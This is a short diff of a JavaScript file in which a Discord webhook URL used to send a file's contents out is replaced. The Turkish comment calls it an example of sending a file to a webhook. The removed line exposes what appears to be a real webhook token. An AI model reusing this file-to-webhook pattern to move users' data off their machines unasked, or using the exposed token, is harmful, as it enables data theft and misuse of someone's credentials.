@@ -518,7 +518,7 @@ ${fs.readFileSync(targetFile, 'utf-8')}\r
 }
 
 // Fonksiyonu kullanarak dosyayı webhook'a gönderme örneği
-const webhookUrl = 'https://discordapp.com/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl';
+const webhookUrl = 'https://discordapp.com/api/webhooks/1113158568741441618/arsht288282828282828282ns2n2n2s2882828282';
 
 
 async function aaaa(params) {
